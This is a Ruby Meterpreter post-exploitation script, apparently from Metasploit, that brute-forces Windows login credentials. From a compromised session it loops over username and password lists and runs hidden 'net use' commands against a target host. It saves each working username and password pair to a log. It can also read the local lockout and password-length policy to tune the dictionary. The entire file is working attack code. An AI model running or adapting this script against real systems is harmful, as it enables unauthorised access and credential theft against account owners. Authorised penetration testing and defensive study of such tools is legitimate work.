# Author: Carlos Perez at carlos_perez[at]darkoperator.com
#-------------------------------------------------------------------------------
################## Variable Declarations ##################
@@exec_opts = Rex::Parser::Arguments.new(
  "-h"  => [ false,  "\tHelp menu."],
  "-t"  => [ true,  "\tTarget IP Address"],
  "-p"  => [ true,  "\tPassword List"],
  "-cp" => [ false,  "\tCheck Local Machine Password Policy"],
  "-L"  => [ true,  "\tUsername List to be brute forced"],
  "-l"  => [ true,  "\tLogin name to be brute forced"]
)
# Variables for Options
user = []
ulopt = nil
userlist = nil
passlist = nil
target = nil
helpcall = 0

# The 'client' object holds the Meterpreter session
# Aliasing here for plugin compatibility
session = client

################## Function Definition ##################
# Function for checking the password policy of current system.
# This policy may resemble the policy of other servers in the
#target enviroment.
def chkpolicy(session)
  print_status("Checking password policy...")
  output = []
  begin
    r = session.sys.process.execute("net accounts", nil, {'Hidden' => true, 'Channelized' => true})
    while(d = r.channel.read)
      output << d
    end
    r.channel.close
    r.close
    # Parsing output of net accounts
    lockout = output.to_s.scan(/Lockout\sthreshold:\s*(\d*)/)
    minpass = output.to_s.scan(/Minimum\spassword\slength:\s*(\d*)/)
    failcount = output.to_s.scan(/Lockout\sobservation\swindow\s\(minutes\)\:\s*(\d*)/)
    lcktime = output.to_s.scan(/Lockout\sduration\s\(minutes\)\:\s*(\d*)/)
    # check for account lockout
    if lockout.empty?
      print_status "\tNo account lockout threshold configured"
    else
      print_status "\tWARNING Lockout threshold configured, if #{lockout} attempts in #{failcount} minutes account will be locked"
      print_status "\tThe account will be locked out for #{lcktime}"
    end
    # check for password lenght
    if minpass.to_s == "0"
      print_status "\tNo minimun password lenght is configured"
    else
      print_status "\tThe minumun password lengh configured is #{minpass}"
      print_status "\tyour dictionary should start with passwords of #{minpass} length"
    end
  rescue ::Exception => e
    print_status("The following Error was encountered: #{e.class} #{e}")
  end
end
#--------------------------------------------------------

# Function for brute forcing passwords using windows native tools
def passbf(session,passlist,target,user,opt,logfile)
  print_status("Running Brute force attack against #{user}")
  print_status("Successfull Username and Password pairs are being saved in #{logfile}")
  result = []
  output = []
  passfnd = 0
  a = []
  i = 0
  if opt == 1
    if not ::File.exists?(user)
      raise "Usernames List File does not exists!"
    else
      user = ::File.open(user, "r")
    end
  end
  # Go thru each user
  user.each do |u|
    # Go thru each line in the password file
    while passfnd < 1
      ::File.open(passlist, "r").each_line do |line|
        begin
          print_status("Trying #{u.chomp} #{line.chomp}")

          # Command for testing local login credentials
          r = session.sys.process.execute("cmd /c net use \\\\#{target} #{line.chomp} /u:#{u.chomp}", nil, {'Hidden' => true, 'Channelized' => true})
          while(d = r.channel.read)
            output << d
          end
          r.channel.close
          r.close

          # Checks if password is found
          result = output.to_s.scan(/The\scommand\scompleted\ssuccessfully/)
          if result.length == 1
            print_status("\tUser: #{u.chomp} pass: #{line.chomp} found")
            file_local_write(logfile,"User: #{u.chomp} pass: #{line.chomp}")
            r = session.sys.process.execute("cmd /c net use \\\\#{target} /delete", nil, {'Hidden' => true, 'Channelized' => true})
            while(d = r.channel.read)
              output << d
            end
            output.clear
            r.channel.close
            r.close
            passfnd = 1
            break
          end
        rescue ::Exception => e
          print_status("The following Error was encountered: #{e.class} #{e}")
        end

      end
      passfnd = 1
    end
    passfnd = 0
  end
end

#--------------------------------------------------------
# Function for creating log file
def logme(target)

  # Create Filename info to be appended to  files
  filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

  # Create a directory for the logs
  logs = ::File.join(Msf::Config.log_directory,'scripts', 'winbf')

  # Create the log directory
  ::FileUtils.mkdir_p(logs)

  #logfile name
  dest = logs + "/" + target + filenameinfo

  dest
end
#--------------------------------------------------------
#
##check for proper Meterpreter Platform
def unsupported
  print_error("This version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end
unsupported if client.platform !~ /win32|win64/i

################## MAIN ##################

# Parsing of Options
@@exec_opts.parse(args) { |opt, idx, val|
  case opt
  when "-l"
    user << val
    ulopt = 0
  when "-L"
    userlist = val
    ulopt = 1

  when "-cp"
    chkpolicy(session)
    exit
  when "-p"

    passlist = val
    if not ::File.exists?(passlist)
      raise "Password File does not exists!"
    end
  when "-t"
    target = val
  when "-h"
    print("Windows Login Brute Force Meterpreter Script\n" +
      "Usage:\n" +
      @@exec_opts.usage)
    helpcall = 1
  end

}

# Execution of options selected
if user.length > 0 && passlist != nil && target != nil

  passbf(session,passlist,target,user,ulopt,logme(target))

elsif userlist != nil && passlist != nil && target != nil

  passbf(session,passlist,target,userlist,ulopt,logme(target))

elsif helpcall == 0
  print("Windows Login Brute Force Meterpreter Script\n" +
    "Usage:\n" +
    @@exec_opts.usage)

end

